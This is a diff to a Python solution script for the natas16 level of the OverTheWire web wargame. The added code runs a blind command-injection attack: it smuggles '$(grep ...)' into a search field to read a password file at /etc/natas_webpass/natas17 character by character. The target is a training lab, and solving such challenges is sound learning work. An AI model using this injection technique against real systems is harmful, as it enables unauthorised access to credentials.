@@ -1,6 +1,7 @@
 import requests
 import bs4
 import re
+import string
 
 
 # configuration for natas16
@@ -55,3 +56,19 @@ response = session.post(URL, data=data)
 div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
 print(f'{div_content}\n')
 # as we can see, the letter 'a' is not in the password as the password is not concatenated with the search result
+
+
+possible_chars = string.ascii_letters + string.digits
+password_chars = ""
+# get all possible letters in the password
+for char in possible_chars:
+    print(f'password_chars: {password_chars + char}', end='\r')
+    data = {
+        'needle' : f'Africans$(grep {char} /etc/natas_webpass/natas17)',
+        'submit' : 'submit'
+    }
+    response = session.post(URL, data=data)
+    # if the word Africans is not returned as the search result, then the letter is in the password
+    if not re.search(r'Africans', response.text):
+        password_chars += char
+        print(f'password_chars: {password_chars}', end='\r')
